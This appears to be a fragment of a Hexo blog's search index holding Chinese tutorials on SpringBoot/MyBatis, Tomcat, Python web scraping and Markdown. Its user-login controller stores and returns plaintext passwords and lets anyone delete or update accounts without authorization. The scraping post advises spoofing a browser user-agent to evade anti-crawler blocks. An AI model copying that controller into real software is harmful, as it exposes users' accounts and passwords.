新建实体类"></a>2. 新建实体类</h2><p>这是一个简单的User类，定义了id，name，password三个属性，以及set，get，toString三个方法。</p><pre><code>public class User &#123;    private int id;    private String name;    private String password;    public int getId() &#123;        return id;    &#125;    public String getName()&#123;        return name;    &#125;    public String getPassword()&#123;        return password;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setPassword(String password) &#123;        this.password = password;    &#125;    public void setId(int id) &#123;        this.id = id;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, password=&#39;&quot; + password + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><h2 id="新建Mapper接口"><a href="#新建Mapper接口" class="headerlink" title="新建Mapper接口"></a>新建Mapper接口</h2><p>在下面代码中，你可以阅读注释，你很容易明白这些@注解的作用。</p><pre><code>@Mapperpublic interface UserMapper&#123;    //返回查询对象的集合    @Select(&quot;select * from user&quot;)    public List&lt;User&gt; findAll();    //返回查询对象    @Select(&quot;select * from user where id = #&#123;id&#125;&quot;)    public User findById(int id);    //将数据库insert语句映射到java程序的insert方法    //返回值为插入语句影响的记录数目    @Insert(&quot;insert into user values (#&#123;id&#125;,#&#123;name&#125;,#&#123;password&#125;)&quot;)    public int insert(int id, String name,String password);    //将数据库delete语句映射到java程序的delete方法    //返回值为删除语句影响的记录数目    @Delete(&quot;delete  from user where id = #&#123;id&#125;&quot;)    public int delete(int id);    //将数据库update语句映射到java程序的update方法    //返回值为更新语句影响的记录数目    @Update(&quot;update user set name = #&#123;newName&#125;,password= #&#123;newPassword&#125; where id = #&#123;id&#125;&quot;)    public int update(int id,String newName,String newPassword);&#125;</code></pre><h2 id="3-编写Controller方法"><a href="#3-编写Controller方法" class="headerlink" title="3. 编写Controller方法"></a>3. 编写Controller方法</h2><p>通过Mapper类你可以将数据库表的数据轻松的赋给java对象或者对数据库进行操作。</p><p>下面是一个用户登录的例子</p><pre><code>@RestControllerpublic class UserController &#123;    @Autowired    private UserMapper userMapper;    //登录    @PostMapping(&quot;/&quot;)    public String login(@RequestParam String name,@RequestParam String password)&#123;        //权限标识        int verify = 0;        //检查账号，密码        List&lt;User&gt; list = userMapper.findAll();        for(int i=0; i&lt;list.size(); i++)&#123;            User useri = list.get(i);            if(useri.getName().equals(name) &amp;&amp; useri.getPassword().equals(password))&#123;                verify = 1;                break;            &#125;        &#125;        //权限判断        if(verify==1)&#123;            return &quot;login&quot;;        &#125;else&#123;            return &quot;error&quot;;        &#125;    &#125;    //返回用户个人信息    @GetMapping(&quot;/user&quot;)    public String info(@RequestParam int id,@RequestParam String name,@RequestParam String token) &#123;        if(getClaimsByToken(token).getSubject().equals(name))&#123;        User user = userMapper.findById(id);        return user.toString();        &#125;else&#123;            return &quot;error&quot;;        &#125;    &#125;    //用户注册    @PostMapping(&quot;/user&quot;)    public String register(@RequestParam String name,@RequestParam String password)&#123;        int id = 0;        userMapper.insert(id,name,password);        return &quot;register&quot;;    &#125;    //用户注销    @DeleteMapping(&quot;/user&quot;)    public String delete(@RequestParam int id)&#123;        userMapper.delete(id);        return &quot;delete&quot;;    &#125;    //修改个人信息    @PutMapping(&quot;/user&quot;)    public String update(@RequestParam int id,@RequestParam String newName,@RequestParam String newPassword) &#123;        userMapper.update(id,newName,newPassword);        return &quot;update&quot;;    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> mybatis </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫（三）：结果保存</title>
      <link href="/posts/spider_save/"/>
      <url>/posts/spider_save/</url>
      
        <content type="html"><![CDATA[<p><em><strong>一般来说会把爬取的结果存储到列表或者字典中，然后将结果写入文件中</strong></em></p><h1 id="一-TXT"><a href="#一-TXT" class="headerlink" title="一. TXT"></a>一. TXT</h1><p>代码比较简单,看一下应该就懂了…</p><p>对于列表</p><pre><code class="Python">    # 是否保存    save = input(&quot;共&quot; + str(len(comment_list)) + &quot;条记录，保存到commen.txt（y/n）：&quot;)    if (save == &quot;y&quot; or save == &quot;Y&quot;):        print(&quot;正在写入中...&quot;)        with open(&quot;comment.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            for comment in tqdm(comment_list):                f.writelines(comment + &quot;\n&quot;)</code></pre><p>对于字典</p><pre><code class="Python">    # 是否保存？    save = input(&quot;共&quot; + str(len(list_dic_blog)) + &quot;条记录，保存到blog.txt（y/n）：&quot;)    if (save == &quot;y&quot; or save == &quot;Y&quot;):        with open(&quot;blog.txt&quot;, &quot;w&quot;, encoding=&#39;Utf-8&#39;) as f:            for dic_blog in tqdm(list_dic_blog):                f.writelines(str(dic_blog) + &quot;\n&quot;)</code></pre><h1 id="二-JSON"><a href="#二-JSON" class="headerlink" title="二. JSON"></a>二. JSON</h1><pre><code class="Python">    json_str = json.dumps(the_dict,indent=4,ensure_ascii=False)    with open(file_name, &#39;w&#39;) as json_file:        json_file.write(json_str)</code></pre><h1 id="三-Excel"><a href="#三-Excel" class="headerlink" title="三. Excel"></a>三. Excel</h1><pre><code class="python"># -*- coding: utf-8 -*-import xlsxwriter as xw  def xw_toExcel(data, fileName):  # xlsxwriter库储存数据到excel    workbook = xw.Workbook(fileName)  # 创建工作簿    worksheet1 = workbook.add_worksheet(&quot;sheet1&quot;)  # 创建子表    worksheet1.activate()  # 激活表    title = [&#39;序号&#39;, &#39;酒店&#39;, &#39;价格&#39;]  # 设置表头    worksheet1.write_row(&#39;A1&#39;, title)  # 从A1单元格开始写入表头    i = 2  # 从第二行开始写入数据    for j in range(len(data)):        insertData = [data[j][&quot;id&quot;], data[j][&quot;name&quot;], data[j][&quot;price&quot;]]        row = &#39;A&#39; + str(i)        worksheet1.write_row(row, insertData)        i += 1    workbook.close()  # 关闭表  # &quot;-------------数据用例-------------&quot;testData = [    &#123;&quot;id&quot;: 1, &quot;name&quot;: &quot;立智&quot;, &quot;price&quot;: 100&#125;,    &#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;维纳&quot;, &quot;price&quot;: 200&#125;,    &#123;&quot;id&quot;: 3, &quot;name&quot;: &quot;如家&quot;, &quot;price&quot;: 300&#125;,]fileName = &#39;测试.xlsx&#39;xw_toExcel(testData, fileName)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Web </tag>
            
            <tag> txt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发（三）-TomCat</title>
      <link href="/posts/web_tomcat/"/>
      <url>/posts/web_tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="一-TomCat-理论"><a href="#一-TomCat-理论" class="headerlink" title="一. TomCat-理论"></a>一. TomCat-理论</h1><h2 id="1-Tomcat基础"><a href="#1-Tomcat基础" class="headerlink" title="1. Tomcat基础"></a>1. Tomcat基础</h2><p>TomCat是一个Web服务器，它默认活跃在电脑的8080端口，接收HTTP请求。</p><p>同时，TomCat提供规范的HTTP接口，它接收规范的HTTP请求，对于Response，你也不需要自己编写，因为TomCat帮助你返回标准的Response。</p><p>下面是具体实现：</p><ul><li><p>当你访问此localhost:8080时，浏览器或者其他代理发送的HTTP请求将会被TomCat截获，</p></li><li><p>如果你在SpringBoot框架中使用TomCat，你可以获取HTTP请求，对数据做处理。</p></li><li><p>最后，你希望对这个请求作出响应，TomCat帮助你构建标准的HTTP响应。</p></li></ul><h1 id="二-TomCat-实现"><a href="#二-TomCat-实现" class="headerlink" title="二. TomCat-实现"></a>二. TomCat-实现</h1><h2 id="1-依赖和配置"><a href="#1-依赖和配置" class="headerlink" title="1. 依赖和配置"></a>1. 依赖和配置</h2><p>当你新建一个SpringBoot项目时，该项目集成了TomCat。</p><p>因此，你不必要花时间去配置TomCat。</p><h2 id="2-Controller类"><a href="#2-Controller类" class="headerlink" title="2. Controller类"></a>2. Controller类</h2><p>一般来说，我们把对请求的处理封装在Controller类中。</p><h3 id="RestController"><a href="#RestController" class="headerlink" title="@RestController"></a>@RestController</h3><p>你可以在使用这个注解标注为Controller类，在这个类中你可以定义函数处理HTTP请求。</p><p>@RestController &#x3D; @Controller + @ResponseBody</p><p>@Controller：将当前修饰的类注入SpringBoot IOC容器，使得从该类所在的项目跑起来的过程中，这个类就被实例化。当然也有语义化的作用，即代表该类是充当Controller的作用</p><p>@ResponseBody：它的作用简短截说就是指该类中所有的API接口返回的数据，甭管你对应的方法返回Map或是其他Object，它会以Json字符串的形式返回给客户端，本人尝试了一下，如果返回的是String类型，则仍然是String。</p><h3 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h3><p>你可以使用这个注解标注函数接收的HTTP请求类型和路径，这样函数对应一个接口。</p><p>@RequestMapping有两个参数，你可以指定HTTp方法，以及接收的参数。</p><p>更简单的方法是使用@GetMapping&#x2F;PostMapping&#x2F;DeleteMapping&#x2F;PutMapping这样你只需要指定接收路径。</p><h3 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h3><p>指定函数必须从HTTP请求中接收的参数，否则报错。</p><h2 id="3-代码实例"><a href="#3-代码实例" class="headerlink" title="3. 代码实例"></a>3. 代码实例</h2><pre><code>@RestControllerpublic class UserController &#123;    @GetMapping(&quot;/index&quot;)    public String getIndex(@RequestParam String name)&#123;        return &quot;Hello &quot;+name;    &#125;&#125;</code></pre><p>当你访问<a href="http://localhost:8080/index?name=tomcat">http://localhost:8080/index?name=tomcat</a>时，你传入name参数值为tomcat。Controller接收后，在响应中返回hello tomcat。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>车载U盘</title>
      <link href="/posts/computer_u/"/>
      <url>/posts/computer_u/</url>
      
        <content type="html"><![CDATA[<p>最近发现一个好玩的东西，车载U盘不知道大家有没有用过。</p><p>暑假，有个哥哥叫我帮他U盘下点歌，顺便删掉里面的一些DJ歌曲。</p><p>我想，这不简单吗？我接过U盘，插在电脑上，吓我一跳，提示我无法打开，需要格式化，这点错歌不全没了吗。</p><p>我才发现，事情没有我想象的那么简单。</p><p>于是，我马上搜索 <em><strong>“车载U盘”</strong></em> 相关信息。</p><p>互联网上信息很多，但是我的信息检索能力还算合格吧。不一会就发现了问题所在。</p><p>一般车子系统是Linux，车载U盘使用也是Linux系统的分区，因此我插入Windows系统的电脑并不能识别出U盘的音乐文件，而是直接提示我格式化U盘。</p><hr><p>原来如此，那么解决方案是什么呢？</p><ul><li><p>最简单的方法：买一根连接U盘的转接线，手机是Linux内核的Android操作系统，因此可以解析车载U盘中的音乐文件。</p></li><li><p>如果你的计算机内装有Linux虚拟机，那么你也可以通过虚拟机连接U盘来对其中的文件进行更改。</p></li></ul><hr><p>嗯，然后就熬夜下歌…最后发现搞错了，啊…joker</p><p>额，怎么说呢？</p><p>一个小小的车载U盘，即使学过操作系统，考试也觉得不难，但是倘若缺乏这次经历，可能我仍不知。</p><p>我就像井底之蛙，但还好没事折腾两下自己，能看看更广阔的天地。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 车载U盘 </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫（二）：响应解析</title>
      <link href="/posts/spider_analysis/"/>
      <url>/posts/spider_analysis/</url>
      
        <content type="html"><![CDATA[<p><em><strong>当你获取响应文件后，你需要做的就是收集其中的关键信息。对不同的响应文件格式你需要选择不同方式解析。</strong></em><br><em><strong>下面是一些常见的响应解析方式</strong></em></p><h1 id="一-Xpath"><a href="#一-Xpath" class="headerlink" title="一. Xpath"></a>一. Xpath</h1><h2 id="1-Xpath基础"><a href="#1-Xpath基础" class="headerlink" title="1. Xpath基础"></a>1. Xpath基础</h2><p>Xpath适用于解析HTML格式文件，并且语法及其简介。</p><h2 id="2-对str对象使用Xpath"><a href="#2-对str对象使用Xpath" class="headerlink" title="2. 对str对象使用Xpath"></a>2. 对str对象使用Xpath</h2><p>对于一般的HTML格式响应对象 <em><strong>response.text()</strong></em> 是字符串类型，因此在使用之前： <code>from lxml import etree</code> </p><h2 id="3-Xpath语法"><a href="#3-Xpath语法" class="headerlink" title="3. Xpath语法"></a>3. Xpath语法</h2><p>这里先举个例子（也是我开始学爬虫的测试网站）</p><p><img src="/img/spider_analysis/image.png" alt="Alt text"></p><p>如果你想拿到 <em><strong>a标签</strong></em> 的href属性：&#x2F;&#x2F;div&#x2F;ul&#x2F;li&#x2F;a&#x2F;@href</p><p>如果你想拿到 <em><strong>img标签</strong></em> 的src属性：&#x2F;&#x2F;div&#x2F;ul&#x2F;li&#x2F;a&#x2F;span&#x2F;img&#x2F;@src</p><p>如果你想拿到 <em><strong>b标签</strong></em> 的内容：&#x2F;&#x2F;div&#x2F;ul&#x2F;li&#x2F;a&#x2F;b&#x2F;text()</p><p>&#x2F;&#x2F;div能够锁定所有div标签，这也是经常使用的Xpath开头，当然你也可以明确定位一个标签&#x2F;&#x2F;div[@class&#x3D;’slist’]</p><p>下面是详细语法</p><p>&#x2F;:子标签<br>&#x2F;&#x2F;:子孙标签<br>@：取属性<br>text()：取内容</p><h1 id="二-JSON"><a href="#二-JSON" class="headerlink" title="二. JSON"></a>二. JSON</h1><h2 id="1-JSON基础"><a href="#1-JSON基础" class="headerlink" title="1. JSON基础"></a>1. JSON基础</h2><p>json用于解析json类型格式响应，这是非常普遍的，在异步加载的网页中，很多后端数据通过json格式传到前端进行渲染，得到浏览器显示的HTML文件。比如微博。</p><h2 id="2-Python字典处理JSON"><a href="#2-Python字典处理JSON" class="headerlink" title="2. Python字典处理JSON"></a>2. Python字典处理JSON</h2><p>Python字典和Java对象很相似，Json（JavaScript Object Notation）也可以通过python字典进行处理。</p><p><code>comment_json = json.loads(response.text)</code></p><h2 id="3-Python字典语法"><a href="#3-Python字典语法" class="headerlink" title="3. Python字典语法"></a>3. Python字典语法</h2><p>这个很简单…</p><p>额..还是记一下吧</p><pre><code class="python">user = &#123;    &#39;uid&#39;: &#39;&#39;    &#39;username&#39;: &#39;&#39;    &#39;password&#39;: &#39;&#39;    &#39;friends&#39;: []&#125;</code></pre><p>dict[“xxx”]:取字典中xxx</p><h1 id="三-BS4"><a href="#三-BS4" class="headerlink" title="三. BS4"></a>三. BS4</h1><h2 id="1-bs4基础"><a href="#1-bs4基础" class="headerlink" title="1. bs4基础"></a>1. bs4基础</h2><h2 id="2-引入bs4"><a href="#2-引入bs4" class="headerlink" title="2. 引入bs4"></a>2. 引入bs4</h2><p><code>from bs4 import BeautifulSoup</code></p><h2 id="3-bs4语法"><a href="#3-bs4语法" class="headerlink" title="3. bs4语法"></a>3. bs4语法</h2><pre><code class="python">soup = BeautifulSoup(resp.content, &#39;html.parser&#39;)tag_div = soup.find_all(&quot;div&quot;,class_=&#39;result c-container xpath-log new-pmd&#39;)link = i.get(&#39;mu&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Web </tag>
            
            <tag> Xpath </tag>
            
            <tag> bs4 </tag>
            
            <tag> json </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客（四）：优雅的写一篇文章</title>
      <link href="/posts/blog_posts/"/>
      <url>/posts/blog_posts/</url>
      
        <content type="html"><![CDATA[<p><em>你需要先了解…</em></p><p><em>有关此文章…</em></p><h1 id="一-MarkDown-MD基础"><a href="#一-MarkDown-MD基础" class="headerlink" title="一. MarkDown&#x2F;MD基础"></a>一. MarkDown&#x2F;MD基础</h1><p>如果你需要向博客上传文章，将MD文档放置到blog&#x2F;hexo&#x2F;source&#x2F;_posts目录下即可。</p><p>类似于WORD文档，MD同样适用于写作和笔记。MD依赖于键盘输入控制文章的排版格式，不需要鼠标意味着你能拥抱更快的写作速度。不必担心的是，MD比WORD要简单的多。</p><p>如果你需要学习，下面是一些MarkDown语法。</p><h2 id="1-标题"><a href="#1-标题" class="headerlink" title="1. 标题"></a>1. 标题</h2><pre><code># 一级标题</code></pre><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><pre><code>## 二级标题</code></pre><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><pre><code>### 三级标题</code></pre><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><pre><code>#### 四级标题</code></pre><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><pre><code>##### 五级标题</code></pre><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><pre><code>###### 六级标题</code></pre><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h2 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h2><p>正文</p><pre><code>正文</code></pre><p><strong>加粗</strong></p><pre><code>**加粗**</code></pre><p><em>斜体</em></p><pre><code>*斜体*</code></pre><p><em><strong>加粗&amp;斜体</strong></em></p><pre><code>***加粗&amp;斜体***</code></pre><h2 id="3-图片-链接"><a href="#3-图片-链接" class="headerlink" title="3. 图片&amp;链接"></a>3. 图片&amp;链接</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>复制图片以后在文档的合适位置粘贴。</p><p><img src="/img/blog_posts/1694181786100.jpeg" alt="Alt text"></p><p>当然你可以更改括号中的图片位置，MD文件会识别同目录下的图片。</p><p>如果你把这些图片放在下层的一个目录进行收录，那么请更改括号中的路径。</p><p>另外，你也可以在括号中放置图片的网页链接。</p><hr><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://www.baidu.com/">百度</a></p><pre><code>[百度](https://www.baidu.com/)</code></pre><h2 id="4-代码"><a href="#4-代码" class="headerlink" title="4. 代码"></a>4. 代码</h2><pre><code class="Python">    print(Hello MarkDown!)</code></pre><pre><code>```Python    print(Hello MarkDown!)```</code></pre><p>你可以在 <strong>&#96;&#96;&#96;</strong> 后面指定代码所使用的语言，当然也可以不指定。</p><h1 id="二-MarkDown美化"><a href="#二-MarkDown美化" class="headerlink" title="二. MarkDown美化"></a>二. MarkDown美化</h1><p>butterfly提供了MD的额外样式。你可以引用这些标注放在MD文档的开头。</p><p>下面是本篇文章的头：</p><pre><code>---title: 博客：优雅的写一篇文章date: 2023-9-8updated:tags: [博客,hexo,butterfly,md]categories: 博客keywords:description:top_img: /img/cover/0.jpgcomments:cover: /img/cover/0.jpgtoc:toc_number:toc_style_simple:copyright:copyright_author:copyright_author_href:copyright_url:copyright_info:mathjax:katex:aplayer:highlight_shrink:aside:abcjs:---</code></pre><p>你可以通过网络了解其他标注的作用。</p><h1 id="三-问题？"><a href="#三-问题？" class="headerlink" title="三. 问题？"></a>三. 问题？</h1><h2 id="1-MD文档中的图片放置？"><a href="#1-MD文档中的图片放置？" class="headerlink" title="1. MD文档中的图片放置？"></a>1. MD文档中的图片放置？</h2><p>当你向MD文件中复制一张图片时，这张图片会被复制到MD的同级目录下。</p><p>建议你在目录blog\hexo\source\img\xxx下存放你的文章xxx，同时更改MD文件中的图片路径。</p><pre><code>![Alt text](img/xxx/liangyue.jpg)</code></pre><p><em><strong>Tips：</strong></em></p><p>更换大量图片路径是枯燥且费时的。</p><p>如果你使用VSCode编辑MD，那么使用’Ctrl+F’对图片路径进行批量更换是个不错的方法。</p><h2 id="2-博客文章的封面图片？"><a href="#2-博客文章的封面图片？" class="headerlink" title="2. 博客文章的封面图片？"></a>2. 博客文章的封面图片？</h2><p>你可以将封面图片放置在以下目录：blog\hexo\themes\butterfly\source\img</p><p>然后在MD文件中更改以下配置</p><pre><code>top_img: /img/xxx.jpgcover: /img/xxx.jpg</code></pre><p>里面存放了一些网页配置的图片：网站背景图片；头像；404页面；默认顶图。</p><p>如果可以，建议你新建一个cover目录，保存封面图片。<br>然后更改一下路径</p><pre><code>top_img: /img/cover/0.jpgcover: /img/cover/0.jpg</code></pre><h2 id="3-MD侧边预览"><a href="#3-MD侧边预览" class="headerlink" title="3. MD侧边预览"></a>3. MD侧边预览</h2><p>如果你使用VScode编辑MD，右上角打开侧边预览</p><p><img src="/img/blog_posts/image.png" alt="Alt text"></p><h2 id="4-如果你有任何问题？"><a href="#4-如果你有任何问题？" class="headerlink" title="4. 如果你有任何问题？"></a>4. 如果你有任何问题？</h2><p>欢迎你给我留言</p><p>同时希望你能通过搜索引擎和GPT解决大部分问题</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
            <tag> VScode </tag>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发（二）-SpringBoot</title>
      <link href="/posts/web_springboot/"/>
      <url>/posts/web_springboot/</url>
      
        <content type="html"><![CDATA[<p><em>你需要先了解…</em></p><p><em>有关此文章…</em></p><h1 id="一-新建SpringBoot项目"><a href="#一-新建SpringBoot项目" class="headerlink" title="一. 新建SpringBoot项目"></a>一. 新建SpringBoot项目</h1><h2 id="1-IDEA新建SpringBoot项目"><a href="#1-IDEA新建SpringBoot项目" class="headerlink" title="1. IDEA新建SpringBoot项目"></a>1. IDEA新建SpringBoot项目</h2><p>(参考文章)[<a href="https://blog.csdn.net/qq_43006591/article/details/106137465]">https://blog.csdn.net/qq_43006591/article/details/106137465]</a></p><h1 id="二-SpringBoot框架解析"><a href="#二-SpringBoot框架解析" class="headerlink" title="二. SpringBoot框架解析"></a>二. SpringBoot框架解析</h1><h2 id="1-idea"><a href="#1-idea" class="headerlink" title="1. .idea"></a>1. .idea</h2><h2 id="2-mvn"><a href="#2-mvn" class="headerlink" title="2. .mvn"></a>2. .mvn</h2><h2 id="3-src"><a href="#3-src" class="headerlink" title="3. src"></a>3. src</h2><h3 id="main"><a href="#main" class="headerlink" title="&#x2F;main"></a>&#x2F;main</h3><ul><li>&#x2F;resource&#x2F;static<br>存放CSS，JS以及图片等</li><li>&#x2F;resource&#x2F;templates<br>存放Web页面</li><li>application.properties&#x2F;application.yml<br>用于存放程序的各种依赖模块的配置信息，比如 服务端口，数据库连接配置等</li><li>&#x2F;main&#x2F;java&#x2F;com.example.xxx<br>存放java源码</li><li>&#x2F;main&#x2F;java&#x2F;Application.java<br>SpringBoot 程序执行的入口，执行该程序中的 main 方法，启动当前SpringBoot项目。</li></ul><h3 id="test"><a href="#test" class="headerlink" title="&#x2F;test"></a>&#x2F;test</h3><p>与mian目录结构类似，没有resource目录。</p><p>存放测试代码。</p><h2 id="4-target"><a href="#4-target" class="headerlink" title="4. target"></a>4. target</h2><p>如果你想测试某个单元，在这里启动它。</p><h2 id="5-gitignore"><a href="#5-gitignore" class="headerlink" title="5. gitignore"></a>5. gitignore</h2><p>使用版本控制工具 git 的时候，设置一些忽略提交的内容</p><h2 id="6-xxx-iml"><a href="#6-xxx-iml" class="headerlink" title="6. xxx.iml"></a>6. xxx.iml</h2><p>intellij idea的工程配置文件，里面是当前project的一些配置信息</p><h2 id="7-HELP-md"><a href="#7-HELP-md" class="headerlink" title="7. HELP.md"></a>7. HELP.md</h2><p>项目的帮助文档，相当于记事本</p><h2 id="8-mvnw"><a href="#8-mvnw" class="headerlink" title="8. mvnw"></a>8. mvnw</h2><p>主要是用于当用户使用maven的命令时，发现本地的maven版本与.mvn文件夹下的maven-wrapper.properties文件中的maven版本不一致，就会下载maven-wrapper.properties文件中的maven版本，然后来执行maven命令，用于Linux环境</p><h2 id="9-mvnw-cmd"><a href="#9-mvnw-cmd" class="headerlink" title="9. mvnw.cmd"></a>9. mvnw.cmd</h2><p>同上，用于Windows环境</p><h2 id="10-pom-xml"><a href="#10-pom-xml" class="headerlink" title="10. pom.xml"></a>10. pom.xml</h2><p>maven依赖的配置</p><h1 id="三-了解更多"><a href="#三-了解更多" class="headerlink" title="三. 了解更多"></a>三. 了解更多</h1><p>(SpringBoot官网)[<a href="https://spring.io/projects/spring-boot]">https://spring.io/projects/spring-boot]</a></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫（一）：请求&amp;响应</title>
      <link href="/posts/spider_request/"/>
      <url>/posts/spider_request/</url>
      
        <content type="html"><![CDATA[<p><em>你需要先了解…</em></p><p><em>关于此文章…</em></p><h1 id="一-Requests-概述"><a href="#一-Requests-概述" class="headerlink" title="一. Requests-概述"></a>一. Requests-概述</h1><p>Request是Python的第三方库，用于网络请求并接收返回的数据，你需要在Python的虚拟环境中安装使用。</p><ul><li><p>Request帮助你发送网络请求，同时你可以自定义Request携带的参数。</p></li><li><p>另外，Request模块接收响应请求的数据，并把Response作为函数的返回。</p></li><li><p>如果你想实现一个爬虫，对返回的网页文件进行Xpath&#x2F;正则表达式解析，并将你需要的内容存储即可。</p></li></ul><h1 id="二-Request基础"><a href="#二-Request基础" class="headerlink" title="二. Request基础"></a>二. Request基础</h1><h2 id="1-下载-安装"><a href="#1-下载-安装" class="headerlink" title="1. 下载&amp;安装"></a>1. 下载&amp;安装</h2><pre><code class="cmd">pip/pip3 install requests</code></pre><h2 id="2-Request库"><a href="#2-Request库" class="headerlink" title="2. Request库"></a>2. Request库</h2><h3 id="关于request"><a href="#关于request" class="headerlink" title="关于request"></a>关于request</h3><p>request支持各种HTTP方法，同时你可以指定请求所携带的内容。</p><ul><li>获取响应文件</li></ul><pre><code class="Python">response = request.get(url)</code></pre><ul><li>带上请求头headers</li></ul><pre><code class="Python">response = request.get(url, headers = headers)</code></pre><ul><li>伪装浏览器代理，避免反爬虫<br>*如果你向<a href="https://www.douban.com/%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%93%8D%E5%BA%94%E7%A0%81%E4%B8%BA418%EF%BC%8C">https://www.douban.com/发送请求，响应码为418，</a></li></ul><pre><code class="Python">headers = &#123;    &#39;user-agent&#39;:    &#39;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 Edg/116.0.1938.69&#39;    &#125;</code></pre><h3 id="关于response"><a href="#关于response" class="headerlink" title="关于response"></a>关于response</h3><p>你可以定义参数response（或者其他名字）接收request的返回。</p><ul><li>返回响应状态码</li></ul><pre><code class="Python">status_code = response.status_code</code></pre><ul><li>返回网页HTML文件</li></ul><pre><code class="Python">content = response.content</code></pre><h3 id="了解更多"><a href="#了解更多" class="headerlink" title="了解更多"></a>了解更多</h3><ul><li><a href="https://www.runoob.com/python3/python-requests.html">菜鸟教程</a></li></ul><h1 id="三-代码实例"><a href="#三-代码实例" class="headerlink" title="三. 代码实例"></a>三. 代码实例</h1><pre><code class="python">    import requests    url = &#39;https://www.baidu.com&#39;    response = requests.get(url)    if(response.status_code == 200):        print(response.content)    else:        print(response.status_code)</code></pre><h1 id="四-问题？"><a href="#四-问题？" class="headerlink" title="四. 问题？"></a>四. 问题？</h1><h2 id="1-response-text-response-content返回中文？"><a href="#1-response-text-response-content返回中文？" class="headerlink" title="1. response.text&#x2F;response.content返回中文？"></a>1. response.text&#x2F;response.content返回中文？</h2><p>你可以使用 <em><strong>response.content.decode(‘utf-8’)</strong></em> 使得content正常的显示中文内容。</p><p>另外， <em><strong>response.text</strong></em> 使用推测的解码格式（ISO-8859-1），相当于 <em><strong>response.content.decode(response.encoding)</strong></em> 。</p><h2 id="2-418-I’m-a-teapot？"><a href="#2-418-I’m-a-teapot？" class="headerlink" title="2. 418 | I’m a teapot？"></a>2. 418 | I’m a teapot？</h2><p>大概：服务器表示我是一个茶壶，需要咖啡的话别找我。</p><p>当然，具体意思需要结合实际场景。</p><p>如果某些网站反爬虫，那么如果你不表示你的代理是浏览器的话，你也会收到418。</p><p>解决方案也很简单，使用 <em><strong>headers{‘user-agent’:’xxx’}</strong></em> 来声称你使用浏览器代理访问网站。</p>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Web </tag>
            
            <tag> Requests </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫：写在前面</title>
      <link href="/posts/spider_pre/"/>
      <url>/posts/spider_pre/</url>
      
